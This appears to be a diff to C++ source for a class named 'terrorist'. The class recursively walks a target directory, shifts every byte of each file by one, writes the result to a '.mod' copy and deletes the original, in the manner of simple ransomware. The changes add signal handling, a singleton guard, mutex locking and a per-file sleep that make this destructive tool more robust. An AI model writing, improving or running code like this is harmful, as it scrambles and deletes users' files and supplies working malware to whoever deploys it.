@@ -1,3 +1,4 @@
+#include <unistd.h>
 #include "terrorist.h"
 
 std::vector<std::string> terrorist::get_all_paths(std::string &root_path){
@@ -25,13 +26,21 @@ void terrorist::dir_work(std::string root_dir) {
 
 
 terrorist::terrorist(std::string main_victim) {
+    if(self_pointer == nullptr){
+        self_pointer = this;
+    }else{
+        throw std::runtime_error("This terrorist already exists");
+    }
     this->main_path = main_victim;
     execution();
 }
 
 void terrorist::execution() {
+    std::signal(1, terrorist::signal_handler);
+    std::signal(2, terrorist::signal_handler);
+    std::signal(15, terrorist::signal_handler);
     std::thread find_new_files_dirs([this](){
-        while(true){
+        while(!signal){
             dir_work(this->main_path);
         }
     });
@@ -58,16 +67,18 @@ auto terrorist::get_iterator(const std::list<std::string> &list, const std::stri
 }
 
 void terrorist::load_list(){
-    while(true) {
+    while(!victims.empty() || !signal) {
+        std::string copy;
         if (!victims.empty()) {
-            if(lock.try_lock()) {
-                std::string copy = victims.front();
+            {
+                std::lock_guard<std::mutex> lg(lock);
+                copy = victims.front();
                 current_terrorism.push_back(copy);
                 victims.pop_front();
-                lock.unlock();
+            }
                 terror(copy);
                 current_terrorism.erase(get_iterator(current_terrorism, copy));
-            }
+
         }
     }
 }
@@ -83,9 +94,42 @@ void terrorist::terror(std::string &victim_path) {
      std::transform(data.begin(), data.end(), data.begin(), [](uint8_t byte){
          return ++byte;
      });
+     sleep(1);
      std::ofstream file_end(victim_path + ".mod", std::ios::binary);
      file_end.write(reinterpret_cast<char*>(data.data()), data.size());
      std::remove(victim_path.c_str());
+}
+
+void terrorist::signal_handler(int signum) {
+    switch(signum){
+        case 1:
+            signal = true;
+            break;
+
+        case 2:
+            signal = true;
+            break;
+
+        case 15:
+            signal = true;
+            break;
+
+    }
+}
+
+terrorist *terrorist::get_self() {
+    if(self_pointer == nullptr){
+        self_pointer = new terrorist();
+    }
+    return self_pointer;
+}
+
+terrorist::terrorist() {
+    if(self_pointer == nullptr){
+    self_pointer = this;
+    } else{
+        throw std::runtime_error("This terrorist already exists");
+    }
 }
 
 
